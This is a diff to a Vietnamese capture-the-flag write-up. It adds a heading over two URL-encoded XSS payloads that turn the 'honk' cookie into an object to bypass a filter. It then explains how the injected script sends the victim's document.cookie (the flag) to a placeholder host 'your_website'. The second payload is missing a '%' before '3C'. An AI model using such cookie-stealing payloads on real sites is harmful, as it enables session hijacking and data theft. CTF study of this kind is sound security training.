@@ -133,10 +133,12 @@ app.get('/', (req, res) => {
 ```
 Ta sẽ làm cho cookie honk thành object và gán 1 trong 2 key với value là payload XSS, khi được render XSS sẽ xảy ra.
 
+#### Payload
 http://localhost:9988/changehonk?newhonk[message]=%3Cscript%3Evar%20i%20%20%3D%20new%20Image%28%29%3B%20i.src%20%3D%20%22https%3A%2F%2Fyour_website%3Fflag%3D%22%20%2B%20document.cookie%20%3C%2Fscript%3E
 
 Hoặc
- http://localhost:9988/changehonk?newhonk[amountoftimeshonked]=3Cscript%3Evar%20i%20%20%3D%20new%20Image%28%29%3B%20i.src%20%3D%20%22https%3A%2F%2Fyour_website%3Fflag%3D%22%20%2B%20document.cookie%20%3C%2Fscript%3E
+ 
+http://localhost:9988/changehonk?newhonk[amountoftimeshonked]=3Cscript%3Evar%20i%20%20%3D%20new%20Image%28%29%3B%20i.src%20%3D%20%22https%3A%2F%2Fyour_website%3Fflag%3D%22%20%2B%20document.cookie%20%3C%2Fscript%3E
 
 #### Giải thích 
 Hàm visit() sẽ truy cập vào url, nên ta sẽ cho truy cập vào localhost:9988 để flag cookie được set, khi ta truy cập vào /changehonk thì cookie honk  sẽ được set honk = req.query.newhonk, sau đấy sẽ redirect về /, sau khi redirect về /, sẽ tiến hành kiểm tra liệu cookie honk có phải là object, vì ta muốn bypass filter XSS nên ta sẽ cho cookie honk thành object, cookie honk sẽ được render và XSS sẽ xảy ra và gửi request tới server của ta với cookie. 
